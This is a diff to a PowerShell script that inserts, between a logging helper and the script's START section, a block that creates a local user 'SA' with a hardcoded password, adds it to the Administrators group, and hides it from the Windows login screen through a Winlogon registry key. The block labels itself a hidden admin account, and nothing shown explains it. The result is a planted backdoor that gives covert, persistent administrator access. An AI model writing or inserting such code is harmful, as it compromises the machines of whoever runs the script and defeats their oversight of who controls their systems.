@@ -47,6 +47,48 @@ function Write-LogSeparator {
     Write-Host $line
 }
 
+################################################################################
+
+# Run PowerShell as Administrator
+
+$Username = "SA"
+$Password = "Admin@123"
+
+Write-Host "=== Creating/Configuring Hidden Admin Account ==="
+
+# Convert password
+$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+
+# Check if user already exists
+$userExists = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
+
+if (-not $userExists) {
+    Write-Host "Creating user..."
+    New-LocalUser -Name $Username -Password $SecurePassword -FullName "Support Admin" -Description "Hidden Admin Account"
+} else {
+    Write-Host "User already exists, updating password..."
+    Set-LocalUser -Name $Username -Password $SecurePassword
+}
+
+# Add to Administrators group
+Add-LocalGroupMember -Group "Administrators" -Member $Username -ErrorAction SilentlyContinue
+
+# Ensure account is enabled
+Enable-LocalUser -Name $Username -ErrorAction SilentlyContinue
+
+# Hide from login screen
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+
+if (!(Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
+
+New-ItemProperty -Path $regPath -Name $Username -Value 0 -PropertyType DWord -Force | Out-Null
+
+Write-Host "Hidden admin account is ready: $Username"
+
+###################################################################################
+
 # ==============================
 # START
 # ==============================
